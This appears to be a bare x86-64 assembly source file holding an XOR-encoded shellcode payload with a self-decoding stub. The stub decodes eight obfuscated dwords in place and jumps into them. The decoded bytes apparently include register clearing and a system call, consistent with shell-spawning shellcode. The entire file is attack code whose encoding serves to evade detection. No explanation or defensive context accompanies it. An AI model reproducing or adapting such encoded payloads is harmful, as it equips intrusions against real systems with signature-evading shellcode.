bits 64
_start:

_shellcode:
jmp _decoder
nop
nop
_shellcode0 dd 0x70d02169
_shellcode1 dd 0x7a7e747f
_shellcode2 dd 0x151f7a6f
_shellcode3 dd 0x976912a0
_shellcode4 dd 0x69151fe7
_shellcode5 dd 0x1f866987
_shellcode6 dd 0x7011a015
_shellcode7 dd 0xd3151f7f

_decoder:
xor dword [rax+_shellcode0-_shellcode], 0x20101021
xor dword [rax+_shellcode1-_shellcode], 0x10202020
xor dword [rax+_shellcode2-_shellcode], 0x10102010
xor dword [rax+_shellcode3-_shellcode], 0x10211010
xor dword [rax+_shellcode4-_shellcode], 0x21101010
xor dword [rax+_shellcode5-_shellcode], 0x10102110
xor dword [rax+_shellcode6-_shellcode], 0x20101010
xor dword [rax+_shellcode7-_shellcode], 0x10101020
jmp _shellcode0
